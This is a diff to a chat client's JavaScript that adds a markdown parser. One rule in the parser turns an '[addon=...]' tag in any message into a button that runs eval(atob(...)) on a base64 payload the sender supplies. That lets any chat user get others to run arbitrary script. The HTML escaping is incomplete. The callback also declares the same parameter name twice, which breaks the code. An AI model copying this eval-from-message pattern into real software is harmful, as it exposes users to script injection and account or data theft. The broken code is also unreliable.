@@ -157,7 +157,30 @@
                         if (matchTest == contactEl.innerText) contactEl.classList.add("active");
                         contactMenu.appendChild(contactEl);
                     }
-
+                    function parseMarkdown(text) {
+                        function htmlEscape(unsafe) {
+                            return unsafe
+                                .replace(/</g, "&lt;")
+                                .replace(/>/g, "&gt;")
+                                .replace(/"/g, "&quot;")
+                                .replace(/_/g, "&#95;");
+                        }
+                        const safe = htmlEscape(text);
+                        return safe
+                            .replace(/(\\)?\[addon=((["'])(?:(?=(\\?))\2.)*?\1)\]([a-zA-Z0-9\/=]+)\[\/addon\]/g, (full, backslash, addon_name, _, _, base64) => {
+                                if (backslash) return full;
+                                return `<button onclick="eval(atob(${JSON.stringify(base64).replace(/"/g, "'")}))">Install addon ${addon_name}</button>`;
+                            })
+                            .replace(/([^\\|^])\*\*([^\*]+)\*\*/g, "$1<b>$2</b>")
+                            .replace(/([^\\|^])\*([^\*]+)\*/g, "$1<i>$2</i>")
+                            .replace(/([^\\|^])__([^\*]+)__/g, "$1<u>$2</u>")
+                            .replace(/([^\\|^])~~([^\*]+)~~/g, "$1<s>$2</s>")
+                            .replace(/\\\*/g, "*")
+                            .replace(/\\\*\*/g, "**")
+                            .replace(/\\__/g, "__")
+                            .replace(/\\~~/g, "~~")
+                            .replace(/\\\\/g, "\\");
+                    }
                     socket.on("history", async function(messages) {   
                         if (rehistory_blocked) return;
                         rehistory_blocked = true;
